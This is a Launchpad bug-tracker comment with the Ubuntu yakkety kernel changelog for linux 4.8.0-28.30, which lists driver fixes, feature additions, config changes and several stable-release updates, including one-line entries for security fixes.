    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package linux - 4.8.0-28.30</p>
<p>---------------<br />
linux (4.8.0-28.30) yakkety; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1641083" class="bug-link">#1641083</a></p>
<p>&nbsp;&nbsp;* lxc-attach to malicious container allows access to host (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mapped uids/gids&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checks</p>
<p>&nbsp;&nbsp;* [Feature] AVX-512 new instruction sets (avx512_4vnniw, avx512_4fmaps)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1637526" class="bug-link">#1637526</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/cpufeature: Add AVX512_4VNNIW and AVX512_4FMAPS features</p>
<p>&nbsp;&nbsp;* zfs: importing zpool with vdev on zvol hangs kernel (LP: <a href="/bugs/1636517" class="bug-link">#1636517</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: (noup) Update zfs to 0.6.5.8-0ubuntu4.1</p>
<p>&nbsp;&nbsp;* Move some device drivers build from kernel built-in to modules<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1637303" class="bug-link">#1637303</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] CONFIG_TIGON3=m for all arches<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] CONFIG_<wbr />VIRTIO_<wbr />BLK=m, CONFIG_VIRTIO_NET=m</p>
<p>&nbsp;&nbsp;* I2C touchpad does not work on AMD platform (LP: <a href="/bugs/1612006" class="bug-link">#1612006</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- pinctrl/amd: Configure GPIO register using BIOS settings</p>
<p>&nbsp;&nbsp;* guest experiencing Transmit Timeouts on CX4 (LP: <a href="/bugs/1636330" class="bug-link">#1636330</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- powerpc/64: Re-fix race condition between going idle and entering guest<br />
&nbsp;&nbsp;&nbsp;&nbsp;- powerpc/64: Fix race condition in setting lock bit in idle/wakeup code</p>
<p>&nbsp;&nbsp;* QEMU throws failure msg while booting guest with SRIOV VF (LP: <a href="/bugs/1630554" class="bug-link">#1630554</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- KVM: PPC: Always select KVM_VFIO, plus Makefile cleanup</p>
<p>&nbsp;&nbsp;* [Feature] KBL - New device ID for Kabypoint(KbP) (LP: <a href="/bugs/1591618" class="bug-link">#1591618</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties</p>
<p>&nbsp;&nbsp;* hio: SSD data corruption under stress test (LP: <a href="/bugs/1638700" class="bug-link">#1638700</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: hio: set bi_error field to signal an I/O error on a BIO<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: hio: splitting bio in the entry of .make_request_fn</p>
<p>&nbsp;&nbsp;* cleanup primary tree for linux-hwe layering issues (LP: <a href="/bugs/1637473" class="bug-link">#1637473</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] switch Vcs-Git: to yakkety repository<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Packaging] handle both linux-lts* and linux-hwe* as backports<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] linux-tools-common and linux-cloud-<wbr />tools-common are one per series<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] linux-source-* is in the primary linux namespace<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] linux-tools -- always suggest the base package</p>
<p>&nbsp;&nbsp;* SRU: sync zfsutils-linux and spl-linux changes to linux (LP: <a href="/bugs/1635656" class="bug-link">#1635656</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: (noup) Update spl to 0.6.5.8-2, zfs to 0.6.5.8-0ubuntu4 (LP:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#1635656)</p>
<p>&nbsp;&nbsp;* [Feature] SKX: perf uncore PMU support (LP: <a href="/bugs/1591810" class="bug-link">#1591810</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- perf/x86/<wbr />intel/uncore: Add Skylake server uncore support<br />
&nbsp;&nbsp;&nbsp;&nbsp;- perf/x86/<wbr />intel/uncore: Remove hard-coded implementation for Node ID mapping<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;location<br />
&nbsp;&nbsp;&nbsp;&nbsp;- perf/x86/<wbr />intel/uncore: Handle non-standard counter offset</p>
<p>&nbsp;&nbsp;* [Feature] Purley: Memory Protection Keys (LP: <a href="/bugs/1591804" class="bug-link">#1591804</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/pkeys: Add fault handling for PF_PK page fault bit<br />
&nbsp;&nbsp;&nbsp;&nbsp;- mm: Implement new pkey_mprotect() system call<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/pkeys: Make mprotect_key() mask off additional vm_flags<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/pkeys: Allocation/free syscalls<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86: Wire up protection keys system calls<br />
&nbsp;&nbsp;&nbsp;&nbsp;- generic syscalls: Wire up memory protection keys syscalls<br />
&nbsp;&nbsp;&nbsp;&nbsp;- pkeys: Add details of system call use to Documentation/<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/pkeys: Default to a restrictive init PKRU<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/pkeys: Allow configuration of init_pkru<br />
&nbsp;&nbsp;&nbsp;&nbsp;- x86/pkeys: Add self-tests</p>
<p>&nbsp;&nbsp;* kernel invalid ...</p></div>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package linux - 4.8.0-28.30

---------------
linux (4.8.0-28.30) yakkety; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1641083

  * lxc-attach to malicious container allows access to host (LP: #1639345)
    - Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires
      mapped uids/gids"
    - (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission
      checks

  * [Feature] AVX-512 new instruction sets (avx512_4vnniw, avx512_4fmaps)
    (LP: #1637526)
    - x86/cpufeature: Add AVX512_4VNNIW and AVX512_4FMAPS features

  * zfs: importing zpool with vdev on zvol hangs kernel (LP: #1636517)
    - SAUCE: (noup) Update zfs to 0.6.5.8-0ubuntu4.1

  * Move some device drivers build from kernel built-in to modules
    (LP: #1637303)
    - [Config] CONFIG_TIGON3=m for all arches
    - [Config] CONFIG_VIRTIO_BLK=m, CONFIG_VIRTIO_NET=m

  * I2C touchpad does not work on AMD platform (LP: #1612006)
    - pinctrl/amd: Configure GPIO register using BIOS settings

  * guest experiencing Transmit Timeouts on CX4 (LP: #1636330)
    - powerpc/64: Re-fix race condition between going idle and entering guest
    - powerpc/64: Fix race condition in setting lock bit in idle/wakeup code

  * QEMU throws failure msg while booting guest with SRIOV VF (LP: #1630554)
    - KVM: PPC: Always select KVM_VFIO, plus Makefile cleanup

  * [Feature] KBL - New device ID for Kabypoint(KbP) (LP: #1591618)
    - SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties

  * hio: SSD data corruption under stress test (LP: #1638700)
    - SAUCE: hio: set bi_error field to signal an I/O error on a BIO
    - SAUCE: hio: splitting bio in the entry of .make_request_fn

  * cleanup primary tree for linux-hwe layering issues (LP: #1637473)
    - [Config] switch Vcs-Git: to yakkety repository
    - [Packaging] handle both linux-lts* and linux-hwe* as backports
    - [Config] linux-tools-common and linux-cloud-tools-common are one per series
    - [Config] linux-source-* is in the primary linux namespace
    - [Config] linux-tools -- always suggest the base package

  * SRU: sync zfsutils-linux and spl-linux changes to linux (LP: #1635656)
    - SAUCE: (noup) Update spl to 0.6.5.8-2, zfs to 0.6.5.8-0ubuntu4 (LP:
      #1635656)

  * [Feature] SKX: perf uncore PMU support (LP: #1591810)
    - perf/x86/intel/uncore: Add Skylake server uncore support
    - perf/x86/intel/uncore: Remove hard-coded implementation for Node ID mapping
      location
    - perf/x86/intel/uncore: Handle non-standard counter offset

  * [Feature] Purley: Memory Protection Keys (LP: #1591804)
    - x86/pkeys: Add fault handling for PF_PK page fault bit
    - mm: Implement new pkey_mprotect() system call
    - x86/pkeys: Make mprotect_key() mask off additional vm_flags
    - x86/pkeys: Allocation/free syscalls
    - x86: Wire up protection keys system calls
    - generic syscalls: Wire up memory protection keys syscalls
    - pkeys: Add details of system call use to Documentation/
    - x86/pkeys: Default to a restrictive init PKRU
    - x86/pkeys: Allow configuration of init_pkru
    - x86/pkeys: Add self-tests

  * kernel invalid opcode in intel_powerclamp (LP: #1630774)
    - SAUCE: (no-up) thermal/powerclamp: correct cpu support check

  * please include mlx5_core modules in linux-image-generic package
    (LP: #1635223)
    - [Config] Include mlx5 in main package

  * [LTCTest] vfio_pci not loaded on Ubuntu 16.10 by default (LP: #1636733)
    - [Config] CONFIG_VFIO_PCI=y for ppc64el

  * Yakkety update to v4.8.6 stable release (LP: #1638748)
    - drm/vc4: Fix races when the CS reads from render targets.
    - drm/prime: Pass the right module owner through to dma_buf_export()
    - drm/i915/backlight: setup and cache pwm alternate increment value
    - drm/i915/backlight: setup backlight pwm alternate increment on backlight
      enable
    - drm/amdgpu: fix IB alignment for UVD
    - drm/amdgpu/dce10: disable hpd on local panels
    - drm/amdgpu/dce8: disable hpd on local panels
    - drm/amdgpu/dce11: disable hpd on local panels
    - drm/amdgpu/dce11: add missing drm_mode_config_cleanup call
    - drm/amdgpu: initialize the context reset_counter in amdgpu_ctx_init
    - drm/amdgpu: change vblank_time's calculation method to reduce computational
      error.
    - drm/radeon: narrow asic_init for virtualization
    - drm/radeon/si/dpm: fix phase shedding setup
    - drm/radeon: change vblank_time's calculation method to reduce computational
      error.
    - drm/vmwgfx: Limit the user-space command buffer size
    - drm/fsl-dcu: fix endian issue when using clk_register_divider
    - drm/amd/powerplay: fix mclk not switching back after multi-head was disabled
    - HID: add quirk for Akai MIDImix.
    - drm/i915/skl: Update plane watermarks atomically during plane updates
    - drm/i915: Move CRTC updating in atomic_commit into it's own hook
    - drm/i915/skl: Update DDB values atomically with wms/plane attrs
    - drm/i915/skl: Don't try to update plane watermarks if they haven't changed
    - drm/i915/gen9: only add the planes actually affected by ddb changes
    - drm/i915/gen9: fix the WaWmMemoryReadLatency implementation
    - drm/i915/gen9: minimum scanlines for Y tile is not always 4
    - drm/i915/gen9: fix plane_blocks_per_line on watermarks calculations
    - drm/i915/gen9: fix the watermark res_blocks value
    - drm/i915: SAGV is not SKL-only, so rename a few things
    - drm/i915: introduce intel_has_sagv()
    - drm/i915/kbl: KBL also needs to run the SAGV code
    - Revert "drm/i915: Check live status before reading edid"
    - drm/i915: Account for TSEG size when determining 865G stolen base
    - drm/i915/skl: Ensure pipes with changed wms get added to the state
    - drm/i915: Allow PCH DPLL sharing regardless of DPLL_SDVO_HIGH_SPEED
    - drm/i915: Move long hpd handling into the hotplug work
    - drm/i915: Allow DP to work w/o EDID
    - drm/i915: Just clear the mmiodebug before a register access
    - drm/i915: Unalias obj-&gt;phys_handle and obj-&gt;userptr
    - posix_acl: Clear SGID bit when setting file permissions
    - rt2x00usb: Fix error return code
    - scsi: cxlflash: Remove the device cleanly in the system shutdown path
    - genirq/generic_chip: Add irq_unmap callback
    - coresight: Remove erroneous dma_free_coherent in tmc_probe
    - uio: fix dmem_region_start computation
    - ARM: clk-imx35: fix name for ckil clk
    - spi: spi-fsl-dspi: Drop extra spi_master_put in device remove function
    - i40e: remove a stray unlock
    - i40e: fix broken i40e_config_rss_aq function
    - mwifiex: correct aid value during tdls setup
    - mwifiex: fix failed to reconnect after interface disabled/enabled
    - ath10k: Add WMI_SERVICE_PERIODIC_CHAN_STAT_SUPPORT wmi service
    - ath10k: fix sending frame in management path in push txq logic
    - ath10k: fix reporting channel survey data
    - ath10k: fix throughput regression in multi client mode
    - crypto: marvell - Don't overwrite default creq-&gt;state during initialization
    - crypto: gcm - Fix IV buffer size in crypto_gcm_setkey
    - crypto: marvell - Update transformation context for each dequeued req
    - crypto: arm/ghash-ce - add missing async import/export
    - crypto: ccp - Fix return value check in ccp_dmaengine_register()
    - hwrng: omap - Only fail if pm_runtime_get_sync returns &lt; 0
    - ASoC: topology: Fix error return code in soc_tplg_dapm_widget_create()
    - ASoC: dapm: Fix possible uninitialized variable in snd_soc_dapm_get_volsw()
    - ASoC: dapm: Fix value setting for _ENUM_DOUBLE MUX's second channel
    - ASoC: dapm: Fix kcontrol creation for output driver widget
    - ASoC: sst-bxt-rt298: fix obsoleted initializers for array
    - ASoC: sst-bxt-da7219_max98357a: fix obsoleted initializers for array
    - iio: ad5755: fix off-by-one on devnr limit check
    - iio: light: us5182d: Add missing error code assignment before test
    - staging: android ion/hisi: fix dependencies
    - staging: sm750fb: Correctly set CLOCK_PHASE bit of display controller.
    - staging: r8188eu: Fix scheduling while atomic splat
    - staging: ks7010: fix wait_for_completion_interruptible_timeout return
      handling
    - staging: ks7010: declare private functions static
    - IB/hfi1: Move iowait_init() to priv allocate
    - IB/rdmavt: Correct sparse annotation
    - IB/qib: Remove qpt_mask global
    - IB/mlx5: Fix steering resource leak
    - power: bq24257: Fix use of uninitialized pointer bq-&gt;charger
    - dmaengine: ipu: remove bogus NO_IRQ reference
    - mm/hugetlb: check for reserved hugepages during memory offline
    - mm/hugetlb: improve locking in dissolve_free_huge_pages()
    - drm/vmwgfx: Avoid validating views on view destruction
    - s390/cio: fix accidental interrupt enabling during resume
    - s390/con3270: fix use of uninitialised data
    - s390/con3270: fix insufficient space padding
    - clk: bcm2835: Skip PLLC clocks when deciding on a new clock parent
    - clk: gcc-msm8996: Fix pcie 2 pipe register offset
    - clk: qcom: select GDSC for msm8996 gcc and mmcc
    - clk: qoriq: fix a register offset error
    - clk: Return errors from clk providers in __of_clk_get_from_provider()
    - clk: core: Force setting the phase delay when no change
    - clk: divider: Fix clk_divider_round_rate() to use clk_readl()
    - perf data: Fix building in 32 bit platform with libbabeltrace
    - perf hists browser: Fix event group display
    - perf powerpc: Fix build-test failure
    - perf ui/tui: Reset output width for hierarchy
    - perf ui/stdio: Always reset output width for hierarchy
    - perf symbols: Check symbol_conf.allow_aliases for kallsyms loading too
    - perf symbols: Fixup symbol sizes before picking best ones
    - iwlwifi: check for valid ethernet address provided by OEM
    - iwlwifi: mvm: fix pending frames tracking on tx resp
    - iwlwifi: mvm: call a different txq_enable function
    - iwlwifi: mvm: free reserved queue on STA removal
    - iwlwifi: mvm: support BAR in reorder buffer
    - iwlwifi: mvm: disable P2P queue on mac context release
    - iwlwifi: mvm: bail out if CTDP start operation fails
    - ARM: dts: sun9i: Add missing #interrupt-cells to R_PIO pinctrl device node
    - pinctrl: qcom: fix masking of pinmux functions
    - mpt3sas: Don't spam logs if logging level is 0
    - powerpc: Always restore FPU/VEC/VSX if hardware transactional memory in use
    - powerpc: Add check_if_tm_restore_required() to giveup_all()
    - powerpc/nvram: Fix an incorrect partition merge
    - powerpc: Fix usage of _PAGE_RO in hugepage
    - ARM: pxa: pxa_cplds: fix interrupt handling
    - ARM: pxa: fix GPIO double shifts
    - ARM: dts: NSP: Correct RAM amount for BCM958625HR board
    - ARM: dts: fix RealView EB SMSC ethernet version
    - ARM: dts: omap3: overo: add missing unit name for lcd35 display
    - PCI: rcar: Fix pci_remap_iospace() failure path
    - PCI: aardvark: Fix pci_remap_iospace() failure path
    - PCI: generic: Fix pci_remap_iospace() failure path
    - PCI: versatile: Fix pci_remap_iospace() failure path
    - PCI: designware: Fix pci_remap_iospace() failure path
    - PCI: tegra: Fix pci_remap_iospace() failure path
    - libnvdimm: clear the internal poison_list when clearing badblocks
    - Linux 4.8.6

  * Yakkety update to v4.8.5 stable release (LP: #1637520)
    - gpio: mpc8xxx: Correct irq handler function
    - mei: fix return value on disconnection
    - mei: me: add kaby point device ids
    - regulator: tps65910: Work around silicon erratum SWCZ010
    - clk: imx6: initialize GPU clocks
    - clk: imx6: fix i.MX6DL clock tree to reflect reality
    - spi: spidev_test: Fix buffer overflow in unescape()
    - PM / devfreq: event: remove duplicate devfreq_event_get_drvdata()
    - ath10k: fix copy engine 5 destination ring stuck
    - rtlwifi: Fix missing country code for Great Britain
    - mmc: block: don't use CMD23 with very old MMC cards
    - mmc: sdhci: cast unsigned int to unsigned long long to avoid unexpeted error
    - PCI: Mark Atheros AR9580 to avoid bus reset
    - PCI: tegra: Fix argument order in tegra_pcie_phy_disable()
    - platform: don't return 0 from platform_get_irq[_byname]() on error
    - cpufreq: ti: Use generic platdev driver
    - cpufreq: conservative: Fix next frequency selection
    - cpufreq: skip invalid entries when searching the frequency
    - cpufreq: intel_pstate: Fix unsafe HWP MSR access
    - cpufreq: fix overflow in cpufreq_table_find_index_dl()
    - parisc: Increase KERNEL_INITIAL_SIZE for 32-bit SMP kernels
    - parisc: Fix self-detected CPU stall warnings on Mako machines
    - parisc: Fix kernel memory layout regarding position of __gp
    - parisc: Increase initial kernel mapping size
    - pstore/ramoops: fixup driver removal
    - pstore/core: drop cmpxchg based updates
    - pstore/ram: Use memcpy_toio instead of memcpy
    - pstore/ram: Use memcpy_fromio() to save old buffer
    - perf intel-pt: Fix snapshot overlap detection decoder errors
    - perf intel-pt: Fix estimated timestamps for cycle-accurate mode
    - perf intel-pt: Fix MTC timestamp calculation for large MTC periods
    - dm: mark request_queue dead before destroying the DM device
    - dm: return correct error code in dm_resume()'s retry loop
    - dm rq: take request_queue lock while clearing QUEUE_FLAG_STOPPED
    - dm mpath: check if path's request_queue is dying in activate_path()
    - dm crypt: fix crash on exit
    - powerpc/xmon: Don't use ld on 32-bit
    - powerpc/vdso64: Use double word compare on pointers
    - powerpc/powernv: Pass CPU-endian PE number to opal_pci_eeh_freeze_clear()
    - powerpc/eeh: Null check uses of eeh_pe_bus_get
    - powerpc/powernv: Use CPU-endian hub diag-data type in
      pnv_eeh_get_and_dump_hub_diag()
    - powerpc/powernv: Use CPU-endian PEST in pnv_pci_dump_p7ioc_diag_data()
    - powerpc/mm: Update FORCE_MAX_ZONEORDER range to allow hugetlb w/4K
    - powerpc/mm/hash64: Fix might_have_hea() check
    - IB/srp: Fix infinite loop when FMR sg[0].offset != 0
    - IB/core: correctly handle rdma_rw_init_mrs() failure
    - ubi: Deal with interrupted erasures in WL
    - zfcp: fix fc_host port_type with NPIV
    - zfcp: fix ELS/GS request&amp;response length for hardware data router
    - zfcp: close window with unblocked rport during rport gone
    - zfcp: retain trace level for SCSI and HBA FSF response records
    - zfcp: restore: Dont use 0 to indicate invalid LUN in rec trace
    - zfcp: trace on request for open and close of WKA port
    - zfcp: restore tracing of handle for port and LUN with HBA records
    - zfcp: fix D_ID field with actual value on tracing SAN responses
    - zfcp: fix payload trace length for SAN request&amp;response
    - zfcp: trace full payload of all SAN records (req,resp,iels)
    - scsi: zfcp: spin_lock_irqsave() is not nestable
    - fbdev/efifb: Fix 16 color palette entry calculation
    - ovl: Fix info leak in ovl_lookup_temp()
    - ovl: copy_up_xattr(): use strnlen
    - mb86a20s: fix the locking logic
    - mb86a20s: fix demod settings
    - cx231xx: don't return error on success
    - cx231xx: fix GPIOs for Pixelview SBTVD hybrid
    - cx231xx: can't proceed if I2C bus register fails
    - ALSA: hda - Fix a failure of micmute led when having multi adcs
    - MIPS: Fix -mabi=64 build of vdso.lds
    - MIPS: ptrace: Fix regs_return_value for kernel context
    - Input: i8042 - skip selftest on ASUS laptops
    - Input: elantech - force needed quirks on Fujitsu H760
    - Input: elantech - add Fujitsu Lifebook E556 to force crc_enabled
    - sunrpc: fix write space race causing stalls
    - NFSD: fix corruption in notifier registration
    - NFS: Fix inode corruption in nfs_prime_dcache()
    - NFSv4: Don't report revoked delegations as valid in nfs_have_delegation()
    - NFSv4: nfs4_copy_delegation_stateid() must fail if the delegation is invalid
    - NFSv4: Open state recovery must account for file permission changes
    - NFSv4.2: Fix a reference leak in nfs42_proc_layoutstats_generic
    - pnfs/blocklayout: fix last_write_offset incorrectly set to page boundary
    - scsi: Fix use-after-free
    - watchdog: rt2880_wdt: Remove assignment of dev pointer
    - watchdog: mt7621_wdt: Remove assignment of dev pointer
    - metag: Only define atomic_dec_if_positive conditionally
    - soc/fsl/qe: fix gpio save_regs functions
    - soc/fsl/qe: fix Oops on CPM1 (and likely CPM2)
    - arm64: KVM: VHE: reset PSTATE.PAN on entry to EL2
    - arc: don't leak bits of kernel stack into coredump
    - fs/super.c: fix race between freeze_super() and thaw_super()
    - cifs: Limit the overall credit acquired
    - fs/cifs: keep guid when assigning fid to fileinfo
    - Clarify locking of cifs file and tcon structures and make more granular
    - Display number of credits available
    - Set previous session id correctly on SMB3 reconnect
    - SMB3: GUIDs should be constructed as random but valid uuids
    - Do not send SMB3 SET_INFO request if nothing is changing
    - Cleanup missing frees on some ioctls
    - blkcg: Unlock blkcg_pol_mutex only once when cpd == NULL
    - x86/e820: Don't merge consecutive E820_PRAM ranges
    - kvm: x86: memset whole irq_eoi
    - x86/platform/UV: Fix support for EFI_OLD_MEMMAP after BIOS callback updates
    - x86/boot/smp: Don't try to poke disabled/non-existent APIC
    - pinctrl: intel: Only restore pins that are used by the driver
    - pinctrl: baytrail: Fix lockdep
    - sched/fair: Fix incorrect task group -&gt;load_avg
    - sched/fair: Fix min_vruntime tracking
    - irqchip/gicv3: Handle loop timeout proper
    - irqchip/eznps: Acknowledge NPS_IPI before calling the handler
    - irqchip/gic-v3-its: Fix entry size mask for GITS_BASER
    - cxl: Prevent adapter reset if an active context exists
    - isofs: Do not return EACCES for unknown filesystems
    - memstick: rtsx_usb_ms: Runtime resume the device when polling for cards
    - memstick: rtsx_usb_ms: Manage runtime PM when accessing the device
    - arm64: swp emulation: bound LL/SC retries before rescheduling
    - arm64: kaslr: fix breakage with CONFIG_MODVERSIONS=y
    - arm64: percpu: rewrite ll/sc loops in assembly
    - arm64: kernel: Init MDCR_EL2 even in the absence of a PMU
    - arm64: Cortex-A53 errata workaround: check for kernel addresses
    - arm64: KVM: Take S1 walks into account when determining S2 write faults
    - ceph: fix error handling in ceph_read_iter
    - powerpc/mm: Prevent unlikely crash in copro_calculate_slb()
    - mmc: core: Annotate cmd_hdr as __le32
    - mmc: core: switch to 1V8 or 1V2 for hs400es mode
    - mmc: rtsx_usb_sdmmc: Avoid keeping the device runtime resumed when unused
    - mmc: rtsx_usb_sdmmc: Handle runtime PM while changing the led
    - KVM: s390: reject invalid modes for runtime instrumentation
    - fscrypto: make XTS tweak initialization endian-independent
    - fscrypto: lock inode while setting encryption policy
    - ext4: do not advertise encryption support when disabled
    - jbd2: fix incorrect unlock on j_list_lock
    - ubifs: Fix xattr_names length in exit paths
    - target/tcm_fc: use CPU affinity for responses
    - target: Re-add missing SCF_ACK_KREF assignment in v4.1.y
    - target: Make EXTENDED_COPY 0xe4 failure return COPY TARGET DEVICE NOT
      REACHABLE
    - target: Don't override EXTENDED_COPY xcopy_pt_cmd SCSI status code
    - Revert "target: Fix residual overflow handling in
      target_complete_cmd_with_length"
    - Linux 4.8.5

  * Yakkety update to v4.8.4 stable release (LP: #1637517)
    - serial: imx: Fix DCD reading
    - BUG: atmel_serial: Interrupts not disabled on close
    - serial: 8250_dw: Check the data-&gt;pclk when get apb_pclk
    - serial: 8250_port: fix runtime PM use in __do_stop_tx_rs485()
    - ARCv2: intc: Use kflag if STATUS32.IE must be reset
    - ARCv2: fix local_save_flags
    - debugfs: introduce a public file_operations accessor
    - b43: fix debugfs crash
    - b43legacy: fix debugfs crash
    - carl9170: fix debugfs crashes
    - Btrfs: fix free space tree bitmaps on big-endian systems
    - Btrfs: fix mount -o clear_cache,space_cache=v2
    - Btrfs: catch invalid free space trees
    - btrfs: assign error values to the correct bio structs
    - mei: amthif: fix deadlock in initialization during a reset
    - drivers: base: dma-mapping: page align the size when unmap_kernel_range
    - IB/hfi1: Fix defered ack race with qp destroy
    - clk: mvebu: fix setting unwanted flags in CP110 gate clock
    - clk: mvebu: dynamically allocate resources in Armada CP110 system controller
    - fuse: listxattr: verify xattr list
    - fuse: invalidate dir dentry after chmod
    - fuse: fix killing s[ug]id in setattr
    - mm: filemap: fix mapping-&gt;nrpages double accounting in fuse
    - i40e: avoid NULL pointer dereference and recursive errors on early PCI error
    - xfs: change mailing list address
    - mm: filemap: don't plant shadow entries without radix tree node
    - brcmfmac: fix pmksa-&gt;bssid usage
    - brcmfmac: fix memory leak in brcmf_fill_bss_param
    - brcmfmac: use correct skb freeing helper when deleting flowring
    - ASoC: nau8825: fix bug in FLL parameter
    - ASoC: Intel: Atom: add a missing star in a memcpy call
    - reiserfs: Unlock superblock before calling reiserfs_quota_on_mount()
    - async_pq_val: fix DMA memory leak
    - scsi: arcmsr: Simplify user_len checking
    - ipc/sem.c: fix complex_count vs. simple op race
    - mm/hugetlb: fix memory offline with hugepage size &gt; memory block size
    - vfs,mm: fix a dead loop in truncate_inode_pages_range()
    - jbd2: fix lockdep annotation in add_transaction_credits()
    - ext4: enforce online defrag restriction for encrypted files
    - ext4: reinforce check of i_dtime when clearing high fields of uid and gid
    - ext4: bugfix for mmaped pages in mpage_release_unused_pages()
    - ext4: fix memory leak in ext4_insert_range()
    - ext4: fix memory leak when symlink decryption fails
    - ext4: allow DAX writeback for hole punch
    - ext4: release bh in make_indexed_dir
    - ext4: unmap metadata when zeroing blocks
    - dlm: free workqueues after the connections
    - vfs: move permission checking into notify_change() for utimes(NULL)
    - cachefiles: Fix attempt to read i_blocks after deleting file [ver #2]
    - drm: virtio: reinstate drm_virtio_set_busid()
    - acpi, nfit: check for the correct event code in notifications
    - cfq: fix starvation of asynchronous writes
    - Linux 4.8.4

  * Yakkety update to v4.8.3 stable release (LP: #1637512)
    - v4l: rcar-fcp: Don't force users to check for disabled FCP support
    - scsi: configure runtime pm before calling device_add in
      scsi_add_host_with_dma
    - Make __xfs_xattr_put_listen preperly report errors.
    - Linux 4.8.3

  * KVM: PPC: Book3S HV: Migrate pinned pages out of CMA (LP: #1632045)
    - KVM: PPC: Book3S HV: Migrate pinned pages out of CMA

  * unexpectedly large memory usage of mounted snaps (LP: #1636847)
    - [Config] switch squashfs to single threaded decode

  * Fix bugs under virtual scsi server driver for Power (LP: #1621088)
    - target/user: Use sense_reason_t in tcmu_queue_cmd_ring
    - target/user: Return an error if cmd data size is too large
    - target/user: Fix comments to not refer to data ring

  * ISST-LTE:pVM nvme 0000:a0:00.0: iommu_alloc failed on NVMe card
    (LP: #1633128)
    - dma-mapping: introduce the DMA_ATTR_NO_WARN attribute
    - powerpc: implement the DMA_ATTR_NO_WARN attribute
    - nvme: use the DMA_ATTR_NO_WARN attribute

  * arm64: kprobes disabled (LP: #1634271)
    - [Config] Enable KPROBES on arm64

  * Bad page state in process genwqe_gunzip pfn:3c275 in the genwqe device
    driver (LP: #1559194)
    - SAUCE: (noup) Bad page state in process genwqe_gunzip pfn:3c275 in the
      genwqe device driver

  * CVE-2016-7425
    - scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()

  * Add ipvlan module to 16.04 kernel (LP: #1634705)
    - [Config] Add ipvlan to the generic inclusion list

  * hio Ubuntu sauce driver needs porting to 4.8 (LP: #1635594)
    - SAUCE: import Huawei ES3000_V2 (2.1.0.23)
    - SAUCE: hio: bio_endio() no longer takes errors arg
    - SAUCE: hio: blk_queue make_request_fn now returns a blk_qc_t
    - SAUCE: hio: use alloc_cpumask_var to avoid -Wframe-larger-than
    - SAUCE: hio: fix mask maybe-uninitialized warning
    - SAUCE: hio: port to v4.8 base
    - [config] enable CONFIG_HIO (Huawei ES3000_V2 PCIe SSD driver)
    - SAUCE: hio: Makefile and Kconfig
    - [Config] Enforce CONFIG_HIO

  * Yakkety update to v4.8.2 stable release (LP: #1633973)
    - usb: storage: fix runtime pm issue in usb_stor_probe2
    - timekeeping: Fix __ktime_get_fast_ns() regression
    - usb: dwc3: fix Clear Stall EP command failure
    - phy: sun4i-usb: Use spinlock to guard phyctl register access
    - ALSA: ali5451: Fix out-of-bound position reporting
    - ALSA: usb-audio: Extend DragonFly dB scale quirk to cover other variants
    - ALSA: usb-line6: use the same declaration as definition in header for MIDI
      manufacturer ID
    - mfd: rtsx_usb: Avoid setting ucr-&gt;current_sg.status
    - mfd: atmel-hlcdc: Do not sleep in atomic context
    - mfd: 88pm80x: Double shifting bug in suspend/resume
    - mfd: wm8350-i2c: Make sure the i2c regmap functions are compiled
    - xen/x86: Update topology map for PV VCPUs
    - KVM: PPC: Book3s PR: Allow access to unprivileged MMCR2 register
    - KVM: MIPS: Drop other CPU ASIDs on guest MMU changes
    - KVM: arm64: Require in-kernel irqchip for PMU support
    - KVM: arm/arm64: vgic: Don't flush/sync without a working vgic
    - KVM: PPC: BookE: Fix a sanity check
    - arm64: fix dump_backtrace/unwind_frame with NULL tsk
    - x86/boot: Fix kdump, cleanup aborted E820_PRAM max_pfn manipulation
    - x86/irq: Prevent force migration of irqs which are not in the vector domain
